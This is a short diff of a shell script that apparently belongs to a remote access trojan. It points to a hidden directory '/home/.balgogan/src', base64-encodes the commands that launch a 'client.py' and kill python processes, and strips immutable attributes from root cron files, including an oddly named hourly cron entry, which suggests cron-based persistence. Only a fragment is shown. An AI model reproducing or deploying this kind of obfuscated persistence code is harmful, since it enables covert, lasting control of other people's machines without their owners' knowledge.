@@ -2,7 +2,7 @@
 PWD=$(pwd)
 RATPWD="/home/.balgogan/src"
 RUNNER=$(echo "python3 $RATPWD/client.py" | base64) 
-KILLER=$(echo "pkill -9 python3" | base64)
+KILLER=$(echo "pkill -9 -f python3" | base64)
 
 chattr -i -a "/etc/cron.d/root" "/etc/cron.d/apache" "/var/spool/cron/root" "/var/spool/cron/crontabs/root" "/etc/cron.hourly/oanacroner1"
 chattr -ia "$RATPWD/*"
